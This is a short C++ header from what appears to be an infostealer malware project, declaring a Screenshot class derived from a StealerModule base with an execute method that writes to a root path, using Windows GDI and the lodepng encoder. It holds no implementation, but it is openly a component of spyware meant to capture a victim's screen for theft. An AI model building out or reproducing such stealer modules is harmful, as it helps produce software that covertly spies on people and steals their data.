//
// Created by .1qxz on 06.06.2024.
//

#ifndef STEALER_SCREENSHOT_H
#define STEALER_SCREENSHOT_H


#include "../StealerModule.h"
#include <wingdi.h>

#define LODEPNG_NO_COMPILE_DISK
#define LODEPNG_COMPILE_ENCODER
#include "lodepng.h"

class Screenshot : public StealerModule {
public:
    void execute(fs::path& root) override;
};


#endif //STEALER_SCREENSHOT_H
